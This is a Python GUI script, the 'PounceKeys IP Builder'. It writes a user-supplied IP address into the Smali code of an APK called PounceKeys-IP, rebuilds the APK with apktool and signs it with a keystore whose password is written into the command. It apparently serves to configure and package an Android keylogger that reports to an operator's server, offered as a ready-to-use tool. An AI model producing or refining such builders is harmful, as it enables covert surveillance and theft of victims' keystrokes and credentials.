import os
import tkinter as tk
import subprocess
import shutil
import threading

def update_message(new_message):
    current_message = message_text.get("1.0", "end")
    message_text.delete("1.0", "end")
    message_text.insert("1.0", current_message + new_message + "\n")
    message_text.see("end")  # Auto-scroll to the end

def replace_values():
   IP = IP_entry.get()

   update_message("Don't click GUI until done")

    # Get the current directory where the script is located
   current_directory = os.getcwd()
    
   update_message("Replacing values in Smali files...")

   if os.path.exists(current_directory):
        for root, dirs, files in os.walk(current_directory):
            for file in files:
                if file.endswith(".smali"):
                    file_path = os.path.join(root, file)

                    with open(file_path, "r") as f:
                        content = f.read()

                    content = content.replace("192.168.0.130", IP)

                    with open(file_path, "w") as f:
                        f.write(content)

        update_message("Updated Auth in Smali files.")
        update_message("Building APK, please wait...")

        apktool_directory = os.path.join(current_directory, "apk")
        apktool_command = f"java -jar {os.path.join(apktool_directory, 'apktool.jar')} b {os.path.join(apktool_directory, 'PounceKeys-IP')}"
        process = subprocess.Popen(apktool_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)

        for line in process.stdout:
            update_message(line.strip())

        for line in process.stderr:
            update_message(line.strip())

        update_message("APK compilation completed.")

        dist_directory = os.path.join(apktool_directory, "PounceKeys-IP", "dist")
        apk_files = [f for f in os.listdir(dist_directory) if f.endswith(".apk")]

        if apk_files:
            for apk_file in apk_files:
                source_path = os.path.join(dist_directory, apk_file)
                destination_path = os.path.join(current_directory, "apk", apk_file)
                shutil.move(source_path, destination_path)

            update_message("APK files moved to 'apk' folder.")
        else:
            update_message("No APK files found in the 'dist' directory.")

        signing_command = "java -jar uber-apk-signer.jar -a apk/ -o ./apk/publish/ --ks key.jks --ksAlias pounce --ksPass 12345678 --ksKeyPass 12345678 --zipAlignPath zip/zipalign.exe"
        process = subprocess.Popen(signing_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)

        for line in process.stdout:
            update_message(line.strip())

        for line in process.stderr:
            update_message(line.strip())

        update_message("APK signing completed.")
        update_message("Your APK can be found in the publish folder.")
   else:
        update_message("Error: Directory not found.")

def start_thread():
    thread = threading.Thread(target=replace_values)
    thread.start()

# Create a GUI window with the customized color scheme
window = tk.Tk()
window.title("PounceKeys IP Builder")
window.configure(bg="black")

# Create input fields with purple text
tk.Label(window, text="IP:", fg="purple", bg="black").pack()
IP_entry = tk.Entry(window)
IP_entry.pack()

# Create a message area with scrolling, black background, and purple text
message_text = tk.Text(window, wrap=tk.WORD, height=15, width=50, bg="black", fg="purple")
message_text.pack()
scrollbar = tk.Scrollbar(window, command=message_text.yview)
scrollbar.pack(side="right", fill="y")
message_text.config(yscrollcommand=scrollbar.set)

# Create a button with the customized color scheme
tk.Button(window, text="Build PounceKey's APK", command=start_thread, fg="purple", bg="black").pack()

# Start the GUI application
window.mainloop()
